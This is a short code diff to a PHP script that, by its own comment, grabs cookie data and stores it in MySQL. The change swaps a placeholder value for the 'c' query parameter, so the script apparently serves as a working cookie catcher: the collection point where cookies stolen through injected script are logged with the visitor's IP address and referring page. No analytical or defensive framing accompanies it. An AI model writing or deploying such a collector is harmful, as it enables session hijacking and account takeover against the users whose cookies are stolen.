@@ -13,6 +13,7 @@ $catcher->connect($db_HOST,$db_USERNAME,$db_PASSWORD,$db_NAME);
 
 ////////////////////////////////////
 ## Grab cookie data and store in MySQL
+$cdata = $_GET['c'];
 $referer = substr($_SERVER['HTTP_REFERER'],0,strpos($_SERVER['HTTP_REFERER'],'?'));
-$catcher->grab($_SERVER['REMOTE_ADDR'],$referer,'testing');
+$catcher->grab($_SERVER['REMOTE_ADDR'],$referer,$cdata);
 ?>
